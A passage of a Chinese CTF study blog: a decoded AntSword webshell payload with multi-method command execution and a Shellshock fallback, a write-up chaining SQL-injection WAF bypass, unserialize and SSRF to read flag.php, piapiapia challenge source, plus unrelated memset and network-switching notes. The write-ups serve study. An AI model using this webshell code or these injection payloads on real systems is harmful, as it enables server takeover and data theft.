juTsP2WmVSO21cYXTPlNYjJDR+BkTtOlAvBBp3fjwhOVlr1khuzAhl2Y799drdSFk=|VIJ6dfEfxNcc1eWhAL0dMWXkGSCnBqv+I+Hqs7mGdK9CG3sMH1LyhIEsYg/UPccftYAPeIqKitOpj4OlNbGQMlf8AIJgFvNceAl7HCwqf/6ggZzfcBx5r4HpCBI3cB2zOOOlX9AFVRcunk3rCZSsaeQ8QGsLC1q/2EImzQqSB5g=&quot;;$pk = &lt;&lt;&lt;EOF-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmXoXBvXeanxgl51HBm2J6HPNhTQtfb8ICioE+n0Ni0DlBFHSBprbsWYKJywVfdhJbLDCCon68uA1UYuy0yteDog3jOdweW2bscEGmeMXLQJfBHpQrg4wWoYJjD3QsKorYT6kdp1LRkuHE3PbpqvRtqO7ALzrcBi88Eu7oZaPANwIDAQAB-----END PUBLIC KEY-----EOF;$cmds = explode(&quot;|&quot;, $ant);$pk = openssl_pkey_get_public($pk);$cmd = &#x27;&#x27;;foreach ($cmds as $value) &#123; if (openssl_public_decrypt(base64_decode($value), $de, $pk)) &#123; $cmd .= $de; &#125;&#125;print_r($cmd);?&gt; 还原后的数据是: 1@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out)&#123;@session_start();$key=@substr(str_pad(session_id(),16,&#x27;a&#x27;),0,16);return @base64_encode(openssl_encrypt(base64_encode($out), &#x27;AES-128-ECB&#x27;, $key, OPENSSL_RAW_DATA));&#125;;;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;f3c7239848e0&quot;;echo @asenc($output);echo &quot;05fda2646c&quot;;&#125;ob_start();try&#123;$p=base64_decode($_POST[&quot;t185a78b977a47&quot;]);$s=base64_decode($_POST[&quot;wd0b7c7ca226cb&quot;]);$envstr=@base64_decode($_POST[&quot;b8dcb72ce2ba93&quot;]);$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \\&quot;&#123;$s&#125;\\&quot;&quot;:&quot;/c \\&quot;&#123;$s&#125;\\&quot;&quot;;if(substr($d,0,1)==&quot;/&quot;)&#123;@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;);&#125;else&#123;@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;);&#125;if(!empty($envstr))&#123;$envarr=explode(&quot;|||asline|||&quot;, $envstr);foreach($envarr as $v) &#123;if (!empty($v)) &#123;@putenv(str_replace(&quot;|||askey|||&quot;, &quot;=&quot;, $v));&#125;&#125;&#125;$r=&quot;&#123;$p&#125; &#123;$c&#125;&quot;;function fe($f)&#123;$d=explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));if(empty($d))&#123;$d=array();&#125;else&#123;$d=array_map(&#x27;trim&#x27;,array_map(&#x27;strtolower&#x27;,$d));&#125;return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));&#125;;function runshellshock($d, $c) &#123;if (substr($d, 0, 1) == &quot;/&quot; &amp;&amp; fe(&#x27;putenv&#x27;) &amp;&amp; (fe(&#x27;error_log&#x27;) || fe(&#x27;mail&#x27;))) &#123;if (strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) &#123;$tmp = tempnam(sys_get_temp_dir(), &#x27;as&#x27;);putenv(&quot;PHP_LOL=() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);if (fe(&#x27;error_log&#x27;)) &#123;error_log(&quot;a&quot;, 1);&#125; else &#123;mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);&#125;&#125; else &#123;return False;&#125;$output = @file_get_contents($tmp);@unlink($tmp);if ($output != &quot;&quot;) &#123;print($output);return True;&#125;&#125;return False;&#125;;function runcmd($c)&#123;$ret=0;$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if(fe(&#x27;system&#x27;))&#123;@system($c,$ret);&#125;elseif(fe(&#x27;passthru&#x27;))&#123;@passthru($c,$ret);&#125;elseif(fe(&#x27;shell_exec&#x27;))&#123;print(@shell_exec($c));&#125;elseif(fe(&#x27;exec&#x27;))&#123;@exec($c,$o,$ret);print(join(&quot; &quot;,$o));&#125;elseif(fe(&#x27;popen&#x27;))&#123;$fp=@popen($c,&#x27;r&#x27;);while(!@feof($fp))&#123;print(@fgets($fp,2048));&#125;@pclose($fp);&#125;elseif(fe(&#x27;proc_open&#x27;))&#123;$p = @proc_open($c, array(1 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;), 2 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;)), $io);while(!@feof($io[1]))&#123;print(@fgets($io[1],2048));&#125;while(!@feof($io[2]))&#123;print(@fgets($io[2],2048));&#125;@fclose($io[1]);@fclose($io[2]);@proc_close($p);&#125;elseif(fe(&#x27;antsystem&#x27;))&#123;@antsystem($c);&#125;elseif(runshellshock($d, $c)) &#123;return $ret;&#125;elseif(substr($d,0,1)!=&quot;/&quot; &amp;&amp; @class_exists(&quot;COM&quot;))&#123;$w=new COM(&#x27;WScript.shell&#x27;);$e=$w-&gt;exec($c);$so=$e-&gt;StdOut();$ret.=$so-&gt;ReadAll();$se=$e-&gt;StdErr();$ret.=$se-&gt;ReadAll();print($ret);&#125;else&#123;$ret = 127;&#125;return $ret;&#125;;$ret=@runcmd($r.&quot; 2&gt;&amp;1&quot;);print ($ret!=0)?&quot;ret=&#123;$ret&#125;&quot;:&quot;&quot;;;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die(); 代码审计在这一串代码中可以发现有几个关键函数：asenc(),asoutput(),发现输出的内容是f3c7239848e0+asenc($output)+05fda2646c，asenc里面是用AES-128-ECB加密，key是session前16位，去包里找就行。 数据还原接下来需要做的就是还原数据，通过代码审计可以知道base64(AES加密（base64(out)）)后的内容是+L8pc9pJEhqPQ1cmL18eJXX9QGADkKnp8A1j7s4oX2Qo8YJNGNTbuaXu+OfynYgRewqyfLj/Wrg0rgKj/cRdO4zJMmfLfyFVB4pBRYeTetM0G/w/Px6+xI/WPlRrx/+MvK6eQyPr+xDqTX82AqiGrOYDwN94/vuGcLS7NAxhty4=把这个解密就行了。解密方法： 12$res=base64_decode(&quot;+L8pc9pJEhqPQ1cmL18eJXX9QGADkKnp8A1j7s4oX2Qo8YJNGNTbuaXu+OfynYgRewqyfLj/Wrg0rgKj/cRdO4zJMmfLfyFVB4pBRYeTetM0G/w/Px6+xI/WPlRrx/+MvK6eQyPr+xDqTX82AqiGrOYDwN94/vuGcLS7NAxhty4=&quot;);$res=openssl_decrypt($payload, &#x27;AES-128-ECB&#x27;, $k,OPENSSL_RAW_DATA) 然后再做两次base64解密就可以得到flag了。(cat flag里面的文件也是base64加密的) 题目总结这道题有点麻烦，主要是不了解蚁剑的流量特征。在awd中shell的免杀与waf永远是在不断迭代升级的。还需要学习的姿势有很多，应该多分析流量，总结特点。 蓝牙数据包蓝牙这道题我一开始看到没什么思路，因为没有学过蓝牙相关的协议。于是从网上现学了点，发现传输数据使用的协议，搜了搜协议名还真搜出来个.7z文件。搜出来之后把这玩意十六进制导入到010editor还原成.7z，提示需要输入密码，首先考虑伪加密，发现不是（其实360会自动修复伪加密）然后看文件名提示了密码是蓝牙的PIN，于是在包中搜索“PIN”。第一次搜索其实我搜到了。。但是没找到PIN,刚想爆破（PIN纯数字，位数少，好爆破）的时候朋友说你搜”PIN”就行。。。我。。吐了。搜到PIN之后解压文件得到flag。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"20200421学习笔记","slug":"20200421学习笔记","date":"2020-04-21T14:32:41.000Z","updated":"2020-04-21T16:14:27.000Z","comments":true,"path":"2020/04/21/20200421学习笔记/","link":"","permalink":"https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"今天做buuoj做了一道web题，总的来说考察到了SQL注入、SSRF、反序列化的知识点。这三个考点我都想到了，但是一块考我是没想到的。参考链接：https://blog.csdn.net/weixin_43818995/article/details/104529233https://blog.csdn.net/weixin_45425482/article/details/103868660https://www.cnblogs.com/appleat/archive/2012/09/03/2669033.htmlhttps://www.w3school.com.cn/sql/sql_union.asp 知识铺垫MYSQL UNION SELECT ：比如select username,password from user union select 1,2UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。可以先根据orderby判断字段个数，判断完字段个数后根据union select 1，2，3…判断在哪儿显示。对union UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名 这句话的举例： MYSQL CONCAT GROUP_CONCATconcat(str1,’separator’,str2) // separator是分隔符可以在结果中连接多个字段 比如下图举例 连接username,password为一个字段。 group_concat()GROUP_CONCAT函数返回一个字符串结果，该结果由分组中的值连接组合而成。简单的来说就是把查询到的数据丢到一行显示，在注入的时候就不用一个个limit了。比如查表名：select group_concat(table_name) from information_schema.tables where table_Schema=数据库名 一条可以查到该数据库所有的表名 SSRFphp的curl未经严格过滤可能导致SSRF（利用file协议。） 题目分析进去之后注册，注册完不知道有啥用了，打开扫描器扫一下，扫到了robots.txtrobots.txt提示了有个user.php的备份，下载下来。 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); &#125;&#125; 对该文件分析可以发现存在SSRF利用点，其他的暂时没想起来。然后看一下/view.php注意url，穿了个参数。。maybe注入？给个-1试试：报错。把绝对路径爆出来了：/var/www/html/view.php再查查试试：-1 union select 1,2,3 给waf了 过滤了啥不知道 挨个试试，应该是过滤了 union select,把空格换成注释绕过。union//select成功绕过。接下来就是判断列数，查数据库名，查表名，查字段。。http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1%20union//select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name=%27users%27 这是查字段然后查data字段 http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1%20union/**/select%201,group_concat(data),3,4%20from%20users发现数据是O:8:”UserInfo”:3:{s:4:”name”;s:6:”123123”;s:3:”age”;i:123123;s:4:”blog”;s:13:”www.baidu.com&quot;;}眼熟不？序列化后的数据？是不是该想想反序列化的问题了？然后读备份的代码，我们应该利用getBlogContents（）方法进行SSRF,内容为file://var/www/html/flag.php，那么注册的时候能填这个不？当然过滤了。所以，我们猜测，完整的流程应该是这样：用户注册http开头的blog，把对象序列化后存入数据库，当用户查询的时候，查询到序列化数据反序列化，然后交给getBlogContents（）方法去用curl发送请求。我们要做的就是让数据库查到的请求返回的是我们恶意构造的序列化对象，该对象的blog为file:///var/www/html/flag.php。就是要把 O:8:”UserInfo”:3:{s:4:”name”;s:3:”123”;s:3:”age”;i:0;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;} 这一串当作查询返回的结果，应该怎么办呢？UNION SELECT！注意与列对应（根据我们刚才查的列，知道data是第四个字段，所以把payload放到第四个字段上对应~）payload:http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,2,3,%27O:8:%22UserInfo%22:3:{s:4:%22name%22;s:4:%22test%22;s:3:%22age%22;i:123;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;}%27然后查看源码中的iframe，解密base64得到flag。 在上帝视角再看这道题为了证明我的思路是正确的，我利用SSRF漏洞获取到了db.php,user.php,show,php,join.ok.php下面是view.php的代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485&lt;?php session_start(); ?&gt;&lt;?php require_once &#x27;db.php&#x27;; ?&gt;&lt;?php require_once &#x27;user.php&#x27;; ?&gt;&lt;?php require_once &#x27;error.php&#x27;; ?&gt;&lt;?php$db = new DB();?&gt;&lt;!doctype html&gt;&lt;html lang=&quot;ko&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;User&lt;/title&gt; &lt;?php require_once &#x27;bootstrap.php&#x27;; ?&gt;&lt;/head&gt;&lt;body&gt;&lt;?php$no = $_GET[&#x27;no&#x27;];if ($db-&gt;anti_sqli($no))&#123; die(&quot;no hack ~_~&quot;);&#125;$res = $db-&gt;getUserByNo($no);$user = unserialize($res[&#x27;data&#x27;]);//print_r($res);?&gt;&lt;div class=&quot;container&quot;&gt; &lt;table class=&quot;table&quot;&gt; &lt;tr&gt; &lt;th&gt; username &lt;/th&gt; &lt;th&gt; age &lt;/th&gt; &lt;th&gt; blog &lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt; &lt;?php echo $res[&#x27;username&#x27;]; ?&gt; &lt;/td&gt; &lt;td&gt; &lt;?php echo $user-&gt;age; ?&gt; &lt;/td&gt; &lt;td&gt; &lt;?php echo xss($user-&gt;blog); ?&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;hr&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;p&gt;the contents of his/her blog&lt;/p&gt; &lt;hr&gt; &lt;?php $response = $user-&gt;getBlogContents(); if ($response === 404) &#123; echo &quot;404 Not found&quot;; &#125; else &#123; $base64 = base64_encode($response); echo &quot;&lt;iframe width=&#x27;100%&#x27; height=&#x27;10em&#x27; src=&#x27;data:text/html;base64,&#123;$base64&#125;&#x27;&gt;&quot;; // echo $response; &#125; // var_dump($user-&gt;getBlogContents()); ?&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 其中， 12$res = $db-&gt;getUserByNo($no);$user = unserialize($res[&#x27;data&#x27;]);//这句话也解释了为什么要对应第四个字段。 这两句话印证了我的思路：反序列化数据库中的data字段—存放的user，反序列化后调用getBlogContents()，在getBlogContents()中调用get(user-&gt;blog)，在这里面CURL请求，然后在前端输出base64加密的值。 总结我太菜了。综合利用还是不行，说明我每个点还没都弄明白。尤其是正则表达式，只能看个大概，复杂的就不懂了，还需要继续学习","categories":[],"tags":[{"name":"php","slug":"php","permalink":"https://polosec.github.io/tags/php/"},{"name":"mysql","slug":"mysql","permalink":"https://polosec.github.io/tags/mysql/"}]},{"title":"c++ memset","slug":"c-memset","date":"2020-04-20T14:12:08.000Z","updated":"2020-04-20T14:23:06.000Z","comments":true,"path":"2020/04/20/c-memset/","link":"","permalink":"https://polosec.github.io/2020/04/20/c-memset/","excerpt":"","text":"最近一直在做动态规划有关的问题，并且经常性的需要把dp数组置为0，就经常性的用memset(dp,0,sizeof(dp))这么写。。直到今天。今天遇到了一道题 需要把dp数组初始化为1，我就像往常一样写了memset(dp,1,sizeof(dp))，但是整体代码写完后怎么都不对 然后输出一看一串奇怪的数字16843009。。 12345678910#include&lt;bits/stdc++.h&gt;using namespace std;int main() &#123; int a[10]; memset(a,1,sizeof(a)); for(int i=0;i&lt;10;i++) cout&lt;&lt;a[i]&lt;&lt;&quot; &quot;; return 0;&#125; what happened?首先要知道memset在哪，在string.h头文件里面。memset是按字节赋值，int4字节，memset(dp,1,sizeof(dp))这句话的意思就是把每个int型的dp的每个字节都赋值为00000001，那么每个int型dp元素的值为：00000001 00000001 00000001 00000001，转换成十进制就是16843009。那为什么赋值0或者-1没错？因为0的补码是00000000，-1的补码是11111111，再翻译回去还是0和-1。所以除了0和-1赋值的话可以用fill。比如fill(a,a+n,1)这样就可以把数组a的每一个元素的值都赋值为1了。","categories":[],"tags":[{"name":"c++","slug":"c","permalink":"https://polosec.github.io/tags/c/"}]},{"title":"二层交换and三层交换","slug":"二层交换and三层交换","date":"2020-04-20T12:31:24.000Z","updated":"2020-04-20T14:10:10.000Z","comments":true,"path":"2020/04/20/二层交换and三层交换/","link":"","permalink":"https://polosec.github.io/2020/04/20/%E4%BA%8C%E5%B1%82%E4%BA%A4%E6%8D%A2and%E4%B8%89%E5%B1%82%E4%BA%A4%E6%8D%A2/","excerpt":"","text":"二层交换与三层交换的问题其实是偶然看到的，看某校夏令营经验贴看到有提问这个问题，正好我不会，记录一下。参考链接：https://zhuanlan.zhihu.com/p/64455461https://blog.csdn.net/Apollon_krj/article/details/82086174https://blog.csdn.net/lycb_gz/article/details/8780851二层交换机工作在数据链路层，根据MAC地址对帧进行转发；三层交换机工作在网络层，对于跨网段的通信，可以做到一次路由，多次交换。 用到的知识点在说二三层转发之前先总结一下用到的知识点，虽然我学过一遍计算机网络，但自认为学的很菜。。有些地方都忘了。。甚至某协议首部某字段还没记住233331.ARPARP协议是由IP地址获得MAC地址，假设两台主机在同一网段，A向B发消息，A知道B的IP地址 但是不知道B的mac地址，所以在局域网内发个广播，目的MAC全为F，意思就是：“谁的IP地址为192.168.2.2？赶紧把mac地址告诉我”局域网内其他主机看到这条消息后发现目的ip不是自己的，于是丢弃；B看到后发现是找的自己，于是把自己的mac地址发给了A，于此同时B在自己的ARP表中记录下A的IP与MAC地址的映射关系。A收到B发的消息后也把B的IP与MAC的映射关系记录到自己的ARP表中。。这就是一次简单的ARP请求2.跨网段通信假设A和B不在一个网段，通信过程应该是这样：先和子网掩码相与，发现不在一个网段，然后找自己的网关，把数据发给网关让网关代为转发；在这个过程中如果不知道网关的MAC就来一次ARP。发送给网关后，查一下路由表，看看下一跳该发到哪了，就这样一直转发，查找下一跳，转发。。无限套娃。套到最后节点，发现目的IP在自己的网段，先看看ARP表有没有记录，没有的话发一次ARP请求，有的话就直接把请求发给目的IP了。3.ARP表 mac表二层交换机维护MAC表，主机维护ARP表 二层交换二层交换是数据链路层的交换，根据mac地址交换。二层交换通信不能跨网段（比如vlan）。二层交换机维护的MAC表是端口和MAC地址的映射关系。 三层交换三层交换又被叫做一次路由，多次交换。这是啥意思？先说一个简单的：假设一台三层交换机划分了vlan1和vlan2，a在vlan1，b在vlan2，a第一次给b发数据的时候还是正常走路由表，等整个过程结束后三层交换机会记录下一条数据，包括了A和B的mac地址端口等相关信息，下次A和B通信的时候直接根据这条数据通过二层转发了，就不用再走路由了。of course,事情没有那么简单，too simple,sometimes naive!上面这句话就图一乐，就像面试问TCP 三次握手的时候你说“客户端发请求，服务器响应，客户端再发一个请求，建立连接。”一样，太不专业了。好的 接下来说个复杂的。 三层交换跨网段通信主机A和B在同一个交换机，但是在不同vlan。观察a和b的通信过程初始化，a发现b和自己不一个网段并且不知道网关的mac，广播一个ARP，目的是找到网关的MAC。网关收到ARP请求后把自己的mac地址发给a，并且在自己的arp表中记录a端口和mac的映射关系。然后把A的IP地址（作为“目的IP地址”）、MAC地址（作为“下一跳MAC地址”），以及与交换机直接相连的端口号等信息下发到三层交换机ASIC芯片中的三层硬件转发表。此时在三层硬件转发表中就有了第一个转发表项，即A的转发表项。A收到网关的应答后，把目的地址修改问网关的mac，并且把数据包发给网关网关收到请求后，先在三层硬件转发表中查找与B有关表项，由于是第一次通信，所以没有，然后进行路由。CPU根据目的地址在router table中查找next hop，发现了直连的主机b，然后在自己的arp表中查b的mac，没有查到，于是发个广播：找B的mac。B收到ARP请求后把自己的mac发给交换机，自己也缓存下。交换机收到b的mac后，在自己的arp表中记录下ip与mac的映射；在三层硬件转发表中新增一项： B的IP地址、MAC地址、进入交换机的端口号等信息。这样就完成了第一次A和B的通信，三层交换机的硬件转发表中多了两项：分别是A的IP A的port A的mac A的vlan 。。。B的IP B的PORT B的MAC B的VLAN 。。。等下次有别的主机想和A或者B通信的时候，由于表中有记录，直接走表中记录的端口转发过去就可以了。即 一次路由，多次交换~（首尾呼应2333 arp全0和全f的问题在网络层的ARP协议（TCP/IP模型）不知道目的mac，所以把目的mac置0；到了数据链路层置为全F 意为广播帧–数据链路层不认识ip。如果有错误欢迎提出，共同进步","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"php unserialize","slug":"php-unserialize","date":"2020-04-17T08:44:47.000Z","updated":"2020-04-17T15:49:48.000Z","comments":true,"path":"2020/04/17/php-unserialize/","link":"","permalink":"https://polosec.github.io/2020/04/17/php-unserialize/","excerpt":"","text":"php unserialize之前没怎么接触过PHP反序列化的问题，这两天碰巧做了一道往年的题，遇到了，算是初步了解了PHP反序列化的问题，记录一下解决思路题目链接：https://buuoj.cn/login?next=%2Fchallenges%3F#%5B0CTF%202016%5Dpiapiapia 环境探测PHP版本5.6 没有发现其他有用信息用扫描器扫了一下发现了网站备份，下载下来。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101&lt;?phpclass.phprequire(&#x27;config.php&#x27;);class user extends mysql&#123; private $table = &#x27;users&#x27;; public function is_exists($username) &#123; $username = parent::filter($username); $where = &quot;username = &#x27;$username&#x27;&quot;; return parent::select($this-&gt;table, $where); &#125; public function register($username, $password) &#123; $username = parent::filter($username); $password = parent::filter($password); $key_list = Array(&#x27;username&#x27;, &#x27;password&#x27;); $value_list = Array($username, md5($password)); return parent::insert($this-&gt;table, $key_list, $value_list); &#125; public function login($username, $password) &#123; $username = parent::filter($username); $password = parent::filter($password); $where = &quot;username = &#x27;$username&#x27;&quot;; $object = parent::select($this-&gt;table, $where); if ($object &amp;&amp; $object-&gt;password === md5($password)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function show_profile($username) &#123; $username = parent::filter($username); $where = &quot;username = &#x27;$username&#x27;&quot;; $object = parent::select($this-&gt;table, $where); return $object-&gt;profile; &#125; public function update_profile($username, $new_profile) &#123; $username = parent::filter($username); $new_profile = parent::filter($new_profile); $where = &quot;username = &#x27;$username&#x27;&quot;; return parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where); &#125; public function __tostring() &#123; return __class__; &#125;&#125;class mysql &#123; private $link = null; public function connect($config) &#123; $this-&gt;link = mysql_connect( $config[&#x27;hostname&#x27;], $config[&#x27;username&#x27;], $config[&#x27;password&#x27;] ); mysql_select_db($config[&#x27;database&#x27;]); mysql_query(&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;); return $this-&gt;link; &#125; public function select($table, $where, $ret = &#x27;*&#x27;) &#123; $sql = &quot;SELECT $ret FROM $table WHERE $where&quot;; $result = mysql_query($sql, $this-&gt;link); return mysql_fetch_object($result); &#125; public function insert($table, $key_list, $value_list) &#123; $key = implode(&#x27;,&#x27;, $key_list); $value = &#x27;\\&#x27;&#x27; . implode(&#x27;\\&#x27;,\\&#x27;&#x27;, $value_list) . &#x27;\\&#x27;&#x27;; $sql = &quot;INSERT INTO $table ($key) VALUES ($value)&quot;; return mysql_query($sql); &#125; public function update($table, $key, $value, $where) &#123; $sql = &quot;UPDATE $table SET $key = &#x27;$value&#x27; WHERE $where&quot;; return mysql_query($sql); &#125; public function filter($string) &#123; $escape = array(&#x27;\\&#x27;&#x27;, &#x27;\\\\\\\\&#x27;); $escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;; $string = preg_replace($escape, &#x27;_&#x27;, $string); $safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;); $safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;; return preg_replace($safe, &#x27;hacker&#x27;, $string); &#125; public function __tostring() &#123; return __class__; &#125;&#125;session_start();$user = new user();$user-&gt;connect($config); 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970config.php&lt;?php $config[&#x27;hostname&#x27;] = &#x27;127.0.0.1&#x27;; $config[&#x27;username&#x27;] = &#x27;root&#x27;; $config[&#x27;password&#x27;] = &#x27;&#x27;; $config[&#x27;database&#x27;] = &#x27;&#x27;; $flag = &#x27;&#x27;;?&gt;update.php&lt;?php require_once(&#x27;class.php&#x27;); if($_SESSION[&#x27;username&#x27;] == null) &#123; die(&#x27;Login First&#x27;); &#125; if($_POST[&#x27;phone&#x27;] &amp;&amp; $_POST[&#x27;email&#x27;] &amp;&amp; $_POST[&#x27;nickname&#x27;] &amp;&amp; $_FILES[&#x27;photo&#x27;]) &#123; $username = $_SESSION[&#x27;username&#x27;]; if(!preg_match(&#x27;/^\\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;])) die(&#x27;Invalid phone&#x27;); if(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;])) die(&#x27;Invalid email&#x27;); if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10) die(&#x27;Invalid nickname&#x27;); $file = $_FILES[&#x27;photo&#x27;]; if($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 1000000) die(&#x27;Photo size error&#x27;); move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;])); $profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;]; $profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;]; $profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;]; $profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]); $user-&gt;update_profile($username, serialize($profile)); echo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;; &#125; else &#123;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;UPDATE&lt;/title&gt; &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt; &lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; &lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt; &lt;h3&gt;Please Update Your Profile&lt;/h3&gt; &lt;label&gt;Phone:&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt; &lt;label&gt;Email:&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt; &lt;label&gt;Nickname:&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt; &lt;label for=&quot;file&quot;&gt;Photo:&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php &#125;?&gt; 阅读源码后发现其资料更新流程是这样的：在update.php点击更新资料后，在本页面处理，经过正则表达式过滤后通过的话，在user类中的update_profile方法中执行序列化后的profile$user-&gt;update_profile($username, serialize($profile));跟进user-&gt;update_profile方法：用户名和资料经过过滤器fileter过滤后直接丢给mysql更新,继续跟进filter主要是正则替换。把危险字段替换为“hacker”。这里有问题。暂时不管，继续跟进。顺利通过filter后则可顺利更新用户资料。再看profile.php里面这句话:$photo = base64_encode(file_get_contents($profile[‘photo’]));file_get_contents 是不是想到了什么？伪协议？我们想读取到的文件是config.php 因为里面已经提示了有flag字段。接下来我们要做的是让file_get_contents()包含config.php这个文件先自己尝试下替换文件名，失败了。接下来考虑伪协议，也失败了。。然后考虑反序列化的问题首先明白什么是反序列化个人理解反序列化就是把对象，变量，各种属性不一的文件通过一种形式的转换转换成字符串（序列化），并且还能通过该字符串还原该对象（反序列化）一个例子就是ss导出配置的时候给他base64解密看看是不是序列化的思想呢2333举个栗子 反序列化严格按照长度进行反序列化，如果长度改变的话可能反序列化失败。比如： 